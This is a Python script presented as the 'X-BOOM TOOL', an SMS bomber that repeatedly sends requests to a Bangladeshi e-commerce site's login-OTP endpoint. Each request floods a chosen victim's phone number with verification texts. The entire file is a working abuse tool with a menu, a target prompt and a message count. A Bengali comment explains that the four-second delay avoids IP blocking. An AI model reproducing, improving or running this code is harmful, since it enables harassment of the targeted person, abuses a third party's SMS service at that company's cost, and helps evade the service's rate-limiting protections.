import requests
import os
import time

def banner():
    os.system('clear')
    print("========================================")
    print("        WELCOME TO X-BOOM TOOL          ")
    print("     Created by: mmalekislam788         ")
    print("     Status: HIGH POWER API ACTIVE      ")
    print("========================================")

def send_sms(target, count):
    # বর্তমানে সচল একটি শক্তিশালী API (Daraz)
    url = "https://member-gateway.daraz.com.bd/membership/gw/otp/send"
    payload = {"phoneNumber": target, "otpType": "LOGIN"}
    
    print(f"\n[+] Global Attack started on: {target}")
    for i in range(count):
        try:
            # Request sending
            response = requests.post(url, json=payload)
            if response.status_code == 200:
                print(f"[!] SMS {i+1} sent successfully!")
            else:
                print(f"[?] Failed (Server Busy) SMS {i+1}")
        except:
            print(f"[-] Network Error at SMS {i+1}")
        
        # ৪ সেকেন্ড বিরতি দিলে আপনার আইপি ব্লক হবে না
        time.sleep(4)

def main():
    banner()
    print("\n[1] Start High-Power Bomber")
    print("[2] Exit")
    choice = input("\nSelect an option: ")
    if choice == '1':
        number = input("Enter Phone Number (01xxxxxxxxx): ")
        amount = int(input("Enter SMS Amount: "))
        send_sms(number, amount)
        print("\n[+] Task Completed!")
    else:
        print("Exiting...")

if __name__ == "__main__":
    main()

